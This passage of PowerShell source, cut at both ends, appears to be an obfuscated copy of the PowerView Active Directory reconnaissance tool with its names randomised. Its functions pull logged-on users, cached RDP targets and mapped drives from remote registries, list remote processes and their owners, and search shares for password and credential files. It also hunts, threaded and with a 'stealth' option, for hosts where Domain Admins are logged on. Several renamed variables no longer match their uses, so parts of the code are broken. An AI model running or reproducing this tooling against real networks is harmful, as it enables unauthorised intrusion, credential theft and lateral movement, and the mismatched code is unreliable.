                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GocAGaEB99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $exXipsBX99['Credential'] = $fjBNCklg99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $wdcZnRBg99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $XmADxhmo99 = New-Object PSObject
                $XmADxhmo99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                $XmADxhmo99 | Add-Member Noteproperty 'LastLoggedOn' $wdcZnRBg99
                $XmADxhmo99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $XmADxhmo99
            }
            catch {
                Write-Warning "[mushing] Error opening remote registry on $GocAGaEB99. Remote registry likely not enabled."
            }
        }
    }
}
function Mfume {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $HKU = 2147483651
            $exXipsBX99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GocAGaEB99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $exXipsBX99['Credential'] = $fjBNCklg99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $jGfLZfdf99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($atdKwnBZ99 in $jGfLZfdf99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $PYHFAZKa99 = belonging -mABfETVW99 $atdKwnBZ99 -fjBNCklg99 $fjBNCklg99
                        }
                        else {
                            $PYHFAZKa99 = belonging -mABfETVW99 $atdKwnBZ99
                        }
                        $oPGSpDfw99 = $Reg.EnumValues($HKU,"$atdKwnBZ99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($nGSMVZFf99 in $oPGSpDfw99) {
                            if ($nGSMVZFf99 -match 'MRU.*') {
                                $mDEqtmgu99 = $Reg.GetStringValue($HKU, "$atdKwnBZ99\Software\Microsoft\Terminal Server Client\Default", $nGSMVZFf99).sValue
                                $LtductHJ99 = New-Object PSObject
                                $LtductHJ99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                                $LtductHJ99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                                $LtductHJ99 | Add-Member Noteproperty 'UserSID' $atdKwnBZ99
                                $LtductHJ99 | Add-Member Noteproperty 'TargetServer' $mDEqtmgu99
                                $LtductHJ99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $LtductHJ99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $LtductHJ99
                            }
                        }
                        $AcdKriox99 = $Reg.EnumKey($HKU,"$atdKwnBZ99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($qgdPgdMB99 in $AcdKriox99) {
                            $SQppakvD99 = $Reg.GetStringValue($HKU, "$atdKwnBZ99\Software\Microsoft\Terminal Server Client\Servers\$qgdPgdMB99", 'UsernameHint').sValue
                            $LtductHJ99 = New-Object PSObject
                            $LtductHJ99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                            $LtductHJ99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                            $LtductHJ99 | Add-Member Noteproperty 'UserSID' $atdKwnBZ99
                            $LtductHJ99 | Add-Member Noteproperty 'TargetServer' $qgdPgdMB99
                            $LtductHJ99 | Add-Member Noteproperty 'UsernameHint' $SQppakvD99
                            $LtductHJ99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $LtductHJ99
                        }
                    }
                    catch {
                        Write-Verbose "[Mfume] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Mfume] Error accessing $GocAGaEB99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function equine {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $HKU = 2147483651
            $exXipsBX99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $GocAGaEB99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $exXipsBX99['Credential'] = $fjBNCklg99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $jGfLZfdf99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($atdKwnBZ99 in $jGfLZfdf99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $PYHFAZKa99 = belonging -mABfETVW99 $atdKwnBZ99 -fjBNCklg99 $fjBNCklg99
                        }
                        else {
                            $PYHFAZKa99 = belonging -mABfETVW99 $atdKwnBZ99
                        }
                        $GBtYAWqB99 = ($Reg.EnumKey($HKU, "$atdKwnBZ99\Network")).sNames
                        ForEach ($CnOEZAtD99 in $GBtYAWqB99) {
                            $sXzrFZaA99 = $Reg.GetStringValue($HKU, "$atdKwnBZ99\Network\$CnOEZAtD99", 'ProviderName').sValue
                            $kasXfJBc99 = $Reg.GetStringValue($HKU, "$atdKwnBZ99\Network\$CnOEZAtD99", 'RemotePath').sValue
                            $ZLKFjHzZ99 = $Reg.GetStringValue($HKU, "$atdKwnBZ99\Network\$CnOEZAtD99", 'UserName').sValue
                            if (-not $PYHFAZKa99) { $PYHFAZKa99 = '' }
                            if ($kasXfJBc99 -and ($kasXfJBc99 -ne '')) {
                                $JrFLEpSy99 = New-Object PSObject
                                $JrFLEpSy99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                                $JrFLEpSy99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                                $JrFLEpSy99 | Add-Member Noteproperty 'UserSID' $atdKwnBZ99
                                $JrFLEpSy99 | Add-Member Noteproperty 'DriveLetter' $CnOEZAtD99
                                $JrFLEpSy99 | Add-Member Noteproperty 'ProviderName' $sXzrFZaA99
                                $JrFLEpSy99 | Add-Member Noteproperty 'RemotePath' $kasXfJBc99
                                $JrFLEpSy99 | Add-Member Noteproperty 'DriveUserName' $ZLKFjHzZ99
                                $JrFLEpSy99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $JrFLEpSy99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[equine] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[equine] Error accessing $GocAGaEB99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function sapling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            try {
                $exXipsBX99 = @{
                    'ComputerName' = $cSHFXHUa99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $exXipsBX99['Credential'] = $fjBNCklg99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $xzZdeUWX99 = New-Object PSObject
                    $xzZdeUWX99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $xzZdeUWX99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $xzZdeUWX99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $xzZdeUWX99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $xzZdeUWX99 | Add-Member Noteproperty 'User' $Owner.User
                    $xzZdeUWX99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $xzZdeUWX99
                }
            }
            catch {
                Write-Verbose "[sapling] Error enumerating remote processes on '$GocAGaEB99', access likely denied: $_"
            }
        }
    }
}
function clemency {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $hUCXRcQf99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $wwOUHzUg99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $gjZqZOTJ99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $PcomkLSR99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $fIcIlwPm99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $gnfVSQQR99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $QNWiBeQc99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $TXrZYLiM99,
        [Switch]
        $IgAnDeAQ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $hUCXRcQf99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $XVFWmInN99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $wwOUHzUg99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $XVFWmInN99['Include'] = @('*.exe')
        }
        $XVFWmInN99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $vSdJuRHv99 = @{}
        function wangles {
            [CmdletBinding()]Param([String]$Path)
            try {
                $zeJtWFxU99 = [IO.File]::OpenWrite($Path)
                $zeJtWFxU99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($UpTLmEbs99 in $Path) {
            if (($UpTLmEbs99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $asmrTIRX99 = (New-Object System.Uri($UpTLmEbs99)).Host
                if (-not $vSdJuRHv99[$asmrTIRX99]) {
                    decaf -cSHFXHUa99 $asmrTIRX99 -fjBNCklg99 $fjBNCklg99
                    $vSdJuRHv99[$asmrTIRX99] = $True
                }
            }
            $XVFWmInN99['Path'] = $UpTLmEbs99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $JYkWZIUe99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $JYkWZIUe99 = $False
                }
                if ($wwOUHzUg99 -and ($_.LastAccessTime -lt $wwOUHzUg99)) {
                    $JYkWZIUe99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $gjZqZOTJ99)) {
                    $JYkWZIUe99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $PcomkLSR99)) {
                    $JYkWZIUe99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (wangles -Path $_.FullName))) {
                    $JYkWZIUe99 = $False
                }
                if ($JYkWZIUe99) {
                    $zBcTtjJF99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $LVdkiQoY99 = New-Object -TypeName PSObject -Property $zBcTtjJF99
                    $LVdkiQoY99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $LVdkiQoY99
                }
            }
        }
    }
    END {
        $vSdJuRHv99.Keys | bonehead
    }
}
function director {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $cSHFXHUa99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $FtFVcezt99,
        [Parameter(Position = 2)]
        [Hashtable]
        $sRRYHnHD99,
        [Int]
        [ValidateRange(1,  100)]
        $eWhlCNWF99 = 20,
        [Switch]
        $SknVpNJS99
    )
    BEGIN {
        $SJVAmhBv99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SJVAmhBv99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $SknVpNJS99) {
            $ezpHcwro99 = Get-Variable -Scope 2
            $JfKvBDhI99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $ezpHcwro99) {
                if ($JfKvBDhI99 -NotContains $Var.Name) {
                $SJVAmhBv99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($wFnAQHAZ99 in (Get-ChildItem Function:)) {
                $SJVAmhBv99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $wFnAQHAZ99.Name, $wFnAQHAZ99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $eWhlCNWF99, $SJVAmhBv99, $Host)
        $Pool.Open()
        $bZssbhYP99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $UwddWtbr99 = $M.GetParameters()
            if (($UwddWtbr99.Count -eq 2) -and $UwddWtbr99[0].Name -eq 'input' -and $UwddWtbr99[1].Name -eq 'output') {
                $bZssbhYP99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $cSHFXHUa99 = $cSHFXHUa99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[director] Total number of hosts: $($cSHFXHUa99.count)"
        if ($eWhlCNWF99 -ge $cSHFXHUa99.Length) {
            $eWhlCNWF99 = $cSHFXHUa99.Length
        }
        $PgjwWOWZ99 = [Int]($cSHFXHUa99.Length/$eWhlCNWF99)
        $LBjDOiCA99 = @()
        $Start = 0
        $End = $PgjwWOWZ99
        for($i = 1; $i -le $eWhlCNWF99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $eWhlCNWF99) {
                $End = $cSHFXHUa99.Length
            }
            $List.AddRange($cSHFXHUa99[$Start..($End-1)])
            $Start += $PgjwWOWZ99
            $End += $PgjwWOWZ99
            $LBjDOiCA99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[director] Total number of threads/partitions: $eWhlCNWF99"
        ForEach ($seeiYmdP99 in $LBjDOiCA99) {
            $FEfXtKCK99 = [PowerShell]::Create()
            $FEfXtKCK99.runspacepool = $Pool
            $Null = $FEfXtKCK99.AddScript($FtFVcezt99).AddParameter('ComputerName', $seeiYmdP99)
            if ($sRRYHnHD99) {
                ForEach ($Param in $sRRYHnHD99.GetEnumerator()) {
                    $Null = $FEfXtKCK99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $YrLtLWOk99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $FEfXtKCK99
                Output = $YrLtLWOk99
                Result = $bZssbhYP99.Invoke($FEfXtKCK99, @($Null, [Management.Automation.PSDataCollection[Object]]$YrLtLWOk99))
            }
        }
    }
    END {
        Write-Verbose "[director] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $LRprKLIB99 = 100
        Write-Verbose "[director] Waiting $LRprKLIB99 seconds for final cleanup..."
        for ($i=0; $i -lt $LRprKLIB99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[director] all threads completed"
    }
}
function peons {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $cSHFXHUa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nMDVGmar99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ZalVoNke99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoAZSdEA99,
        [Alias('Unconstrained')]
        [Switch]
        $PjJeGKTQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $MODrPMHQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $oOOUrUST99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $dUbmyVFn99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Ymfcwbqe99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CQMlcaaA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MVfuQiFt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $pCHGOVug99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $kKCyknRq99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ljdPYnWY99,
        [Alias('AllowDelegation')]
        [Switch]
        $tJsUmAHA99,
        [Switch]
        $vLJHInkE99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $PkrqKVpc99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $bdvUWGhd99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $URGDXFNN99,
        [Switch]
        $etMNQulS99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $SNGQPNnl99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $eWhlCNWF99 = 20
    )
    BEGIN {
        $WEzzUqjJ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $WEzzUqjJ99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['ComputerDomain']) { $WEzzUqjJ99['Domain'] = $nMDVGmar99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $WEzzUqjJ99['LDAPFilter'] = $ZalVoNke99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $WEzzUqjJ99['SearchBase'] = $qoAZSdEA99 }
        if ($PSBoundParameters['Unconstrained']) { $WEzzUqjJ99['Unconstrained'] = $SKpvyXsg99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $WEzzUqjJ99['OperatingSystem'] = $rqmKHnWu99 }
        if ($PSBoundParameters['ComputerServicePack']) { $WEzzUqjJ99['ServicePack'] = $gNnwgaEV99 }
        if ($PSBoundParameters['ComputerSiteName']) { $WEzzUqjJ99['SiteName'] = $iSntscLt99 }
        if ($PSBoundParameters['Server']) { $WEzzUqjJ99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $WEzzUqjJ99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $WEzzUqjJ99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WEzzUqjJ99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $WEzzUqjJ99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $WEzzUqjJ99['Credential'] = $fjBNCklg99 }
        $AvPmHxSP99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $AvPmHxSP99['Identity'] = $Ymfcwbqe99 }
        if ($PSBoundParameters['Domain']) { $AvPmHxSP99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['UserDomain']) { $AvPmHxSP99['Domain'] = $CQMlcaaA99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $AvPmHxSP99['LDAPFilter'] = $MVfuQiFt99 }
        if ($PSBoundParameters['UserSearchBase']) { $AvPmHxSP99['SearchBase'] = $pCHGOVug99 }
        if ($PSBoundParameters['UserAdminCount']) { $AvPmHxSP99['AdminCount'] = $ljdPYnWY99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $AvPmHxSP99['AllowDelegation'] = $tJsUmAHA99 }
        if ($PSBoundParameters['Server']) { $AvPmHxSP99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $AvPmHxSP99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $AvPmHxSP99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AvPmHxSP99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $AvPmHxSP99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $AvPmHxSP99['Credential'] = $fjBNCklg99 }
        $DCHakmFd99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $DCHakmFd99 = @($cSHFXHUa99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[peons] Stealth enumeration using source: $SNGQPNnl99"
                $JRqaZJsU99 = New-Object System.Collections.ArrayList
                if ($SNGQPNnl99 -match 'File|All') {
                    Write-Verbose '[peons] Querying for file servers'
                    $WuLICWsC99 = @{}
                    if ($PSBoundParameters['Domain']) { $WuLICWsC99['Domain'] = $jnYnRnFJ99 }
                    if ($PSBoundParameters['ComputerDomain']) { $WuLICWsC99['Domain'] = $nMDVGmar99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $WuLICWsC99['SearchBase'] = $qoAZSdEA99 }
                    if ($PSBoundParameters['Server']) { $WuLICWsC99['Server'] = $qgdPgdMB99 }
                    if ($PSBoundParameters['SearchScope']) { $WuLICWsC99['SearchScope'] = $TRVzBsDk99 }
                    if ($PSBoundParameters['ResultPageSize']) { $WuLICWsC99['ResultPageSize'] = $CgYkCByk99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $WuLICWsC99['ServerTimeLimit'] = $elDiVqTz99 }
                    if ($PSBoundParameters['Tombstone']) { $WuLICWsC99['Tombstone'] = $rmzHuzlC99 }
                    if ($PSBoundParameters['Credential']) { $WuLICWsC99['Credential'] = $fjBNCklg99 }
                    $CUBNEskH99 = elucidate @FileServerSearcherArguments
                    if ($CUBNEskH99 -isnot [System.Array]) { $CUBNEskH99 = @($CUBNEskH99) }
                    $JRqaZJsU99.AddRange( $CUBNEskH99 )
                }
                if ($SNGQPNnl99 -match 'DFS|All') {
                    Write-Verbose '[peons] Querying for DFS servers'
                }
                if ($SNGQPNnl99 -match 'DC|All') {
                    Write-Verbose '[peons] Querying for domain controllers'
                    $fNBqPzcT99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $fNBqPzcT99['Domain'] = $jnYnRnFJ99 }
                    if ($PSBoundParameters['ComputerDomain']) { $fNBqPzcT99['Domain'] = $nMDVGmar99 }
                    if ($PSBoundParameters['Server']) { $fNBqPzcT99['Server'] = $qgdPgdMB99 }
                    if ($PSBoundParameters['Credential']) { $fNBqPzcT99['Credential'] = $fjBNCklg99 }
                    $SlDuwDvR99 = basso @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($SlDuwDvR99 -isnot [System.Array]) { $SlDuwDvR99 = @($SlDuwDvR99) }
                    $JRqaZJsU99.AddRange( $SlDuwDvR99 )
                }
                $DCHakmFd99 = $JRqaZJsU99.ToArray()
            }
            else {
                Write-Verbose '[peons] Querying for all computers in the domain'
                $DCHakmFd99 = cowing @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[peons] TargetComputers length: $($DCHakmFd99.Length)"
        if ($DCHakmFd99.Length -eq 0) {
            throw '[peons] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $KSiSznAB99 = $fjBNCklg99.GetNetworkCredential().UserName
        }
        else {
            $KSiSznAB99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $fHLMiIko99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $fHLMiIko99 = suit @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $okUVKRDf99 = @{
                'Identity' = $kKCyknRq99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $okUVKRDf99['Domain'] = $CQMlcaaA99 }
            if ($PSBoundParameters['UserSearchBase']) { $okUVKRDf99['SearchBase'] = $pCHGOVug99 }
            if ($PSBoundParameters['Server']) { $okUVKRDf99['Server'] = $qgdPgdMB99 }
            if ($PSBoundParameters['SearchScope']) { $okUVKRDf99['SearchScope'] = $TRVzBsDk99 }
            if ($PSBoundParameters['ResultPageSize']) { $okUVKRDf99['ResultPageSize'] = $CgYkCByk99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $okUVKRDf99['ServerTimeLimit'] = $elDiVqTz99 }
            if ($PSBoundParameters['Tombstone']) { $okUVKRDf99['Tombstone'] = $rmzHuzlC99 }
            if ($PSBoundParameters['Credential']) { $okUVKRDf99['Credential'] = $fjBNCklg99 }
            $fHLMiIko99 = Mapplethorpe @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[peons] TargetUsers length: $($fHLMiIko99.Length)"
        if ((-not $URGDXFNN99) -and ($fHLMiIko99.Length -eq 0)) {
            throw '[peons] No users found to target'
        }
        $moQfbXMC99 = {
            Param($cSHFXHUa99, $fHLMiIko99, $KSiSznAB99, $etMNQulS99, $zkuRoAPL99)
            if ($zkuRoAPL99) {
                $Null = watchman -zkuRoAPL99 $zkuRoAPL99 -Quiet
            }
            ForEach ($ySXJaLJG99 in $cSHFXHUa99) {
                $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $ySXJaLJG99
                if ($Up) {
                    $QYmGjFDJ99 = Roeg -cSHFXHUa99 $ySXJaLJG99
                    ForEach ($nZknnAWD99 in $QYmGjFDJ99) {
                        $PYHFAZKa99 = $nZknnAWD99.UserName
                        $CName = $nZknnAWD99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($PYHFAZKa99) -and ($PYHFAZKa99.Trim() -ne '') -and ($PYHFAZKa99 -notmatch $KSiSznAB99) -and ($PYHFAZKa99 -notmatch '\$$')) {
                            if ( (-not $fHLMiIko99) -or ($fHLMiIko99 -contains $PYHFAZKa99)) {
